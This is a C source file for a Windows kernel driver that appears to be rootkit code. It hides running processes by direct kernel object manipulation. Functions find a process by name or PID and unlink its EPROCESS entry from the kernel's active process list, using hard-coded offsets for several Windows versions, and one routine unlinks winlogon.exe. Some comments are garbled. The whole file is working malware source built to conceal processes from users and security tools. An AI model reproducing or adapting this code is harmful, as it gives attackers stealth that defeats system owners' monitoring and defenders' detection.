#include "ntddk.h"
#include "stdio.h"
#include "stdlib.h"

typedef unsigned long DWORD;
typedef DWORD * PDWORD;

#define FILE_DEVICE_ROOTKIT      0x00002a7b

int FLINKOFFSET;
int PIDOFFSET;

#define   DebugPrint    DbgPrint

NTSTATUS PsLookupProcessByProcessId(IN ULONG ulProcId, OUT PEPROCESS *pEProcess);

DWORD FindProcessEPROC (int terminate_PID)
{
    DWORD eproc       = 0x00000000;
    int   current_PID = 0;
    int   start_PID   = 0;
    int   i_count     = 0;
    PLIST_ENTRY plist_active_procs;


    if (terminate_PID == 0)
        return terminate_PID;

    eproc = (DWORD) PsGetCurrentProcess();//???PLIST_ENTRY
    start_PID = *((DWORD*)(eproc+PIDOFFSET));//PIDOFFSET?PLIST_ENTRYбID?
    current_PID = start_PID;

    while (1)//PLIST_ENTRY
    {
        if (terminate_PID == current_PID)
            return eproc;
        else if ((i_count >= 1) && (start_PID == current_PID))
        {
            return 0x00000000;
        }
        else
        {
            plist_active_procs = (LIST_ENTRY *) (eproc+FLINKOFFSET);
            eproc = (DWORD) plist_active_procs->Flink;
            eproc = eproc - FLINKOFFSET;
            current_PID = *((int *)(eproc+PIDOFFSET));
            i_count++;
        }
    }
}

int init()
{
    DWORD BuildNum,mj,mi;

    PsGetVersion(&mj,&mi,&BuildNum,NULL);
    
    // 2195	win2000,2600	winxp,3790	win2003

    if (mj==5)
    {
    	if(mi==0)
    	{
	    	PIDOFFSET = 156;
        	FLINKOFFSET = 160;
	    }
	    else if(mi==1||mi==2)
	    {
    		PIDOFFSET = 132;
        	FLINKOFFSET = 136;
    	}
        
    }
    else if (mj==4)
    {
        if(mi==0)
        {
        	PIDOFFSET = 148;
        	FLINKOFFSET = 152;
        }		
    }
    else if (mj==6)
    {
        if(mi==1)
        {
        	PIDOFFSET = 0x0b4;
        	FLINKOFFSET = 0x0b8;
        }
		
    }
    else	//As Win2000
    {
        
    }

    return 0;
}

int Getpid(char pname[])
{
	NTSTATUS ntStatus;
	char ProcessName[256];
	ULONG cbBuffer=1024; 
	PSYSTEM_PROCESS_INFORMATION pInfo;
	PSYSTEM_THREAD_INFORMATION pThread;
	VOID* pBuffer = NULL;
	ULONG i;
   
	ZwQuerySystemInformation(5, &cbBuffer, 0, &cbBuffer);
   
	pBuffer = ExAllocatePool (NonPagedPool, cbBuffer); 
	if (pBuffer == NULL) 
	{
		return 0;
	}
	ntStatus = ZwQuerySystemInformation(5, pBuffer, cbBuffer, NULL);
     
	if (!NT_SUCCESS(ntStatus))
	{
		ExFreePool(pBuffer); 
		return 0; 
	}
    
    pInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
     
    while(1)
	{
		LPWSTR pszProcessName = pInfo->ProcessName.Buffer;
         
		if (pszProcessName == NULL) 
         	pszProcessName = L"NULL"; 

		wcstombs(ProcessName,pszProcessName,256); 
         
		if(_stricmp(pname,ProcessName)==0)
		{
			KdPrint(("the %s is %d\n",pname,pInfo->ProcessId));
			ExFreePool(pBuffer); 
			return pInfo->ProcessId;
		} 
		
		if (pInfo->NextEntryDelta == 0) 
             break; 

         pInfo = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pInfo)+ pInfo->NextEntryDelta);
     }
     
	ExFreePool(pBuffer); 

	return 0;
}
 
int DKOMPROC(int pid2hide)
{	
    int  find_PID;

    DWORD eproc      = 0x00000000;
    PLIST_ENTRY          plist_active_procs = NULL;

	init();

    find_PID = pid2hide;

    if (find_PID == 0x00000000)
    {
        return 0;
    }

    //eproc = FindProcessEPROC(find_PID);//?ID??
    
    if(!NT_SUCCESS(PsLookupProcessByProcessId(find_PID,(PEPROCESS *) &eproc)))
    {
    	return 0;
    }
    
    if (eproc == 0x00000000)
    {
        return 0;
    }

    plist_active_procs = (LIST_ENTRY *) (eproc+FLINKOFFSET);
    //*((DWORD *)plist_active_procs->Blink) = (DWORD) plist_active_procs->Flink;
    //*((DWORD *)plist_active_procs->Flink+1) = (DWORD) plist_active_procs->Blink;
    
    RemoveEntryList(plist_active_procs);

    return 1;
}

void DelProcessList()  
{  
    PLIST_ENTRY List,PsActiveProcessHead;
    DWORD eproc;
	eproc = (DWORD) PsGetCurrentProcess();
	PsActiveProcessHead=(LIST_ENTRY *) (eproc+FLINKOFFSET);  
	List= PsActiveProcessHead->Blink;
    while( List != PsActiveProcessHead )  
    {  
        char* name = ((char*)List-0xa0)+0x1fc;       
        if ( !_stricmp(name,"winlogon.exe") )  
        {  
            KdPrint(("remove %s \n",name));  
            RemoveEntryList(List);  
        }  
        List=List->Blink;                
    }  
} 

int DKOMPROCHIDE(char pname[])
{
	int pid;
	
	pid=Getpid(pname);
	
	//DelProcessList();
	
	return DKOMPROC(pid);
}
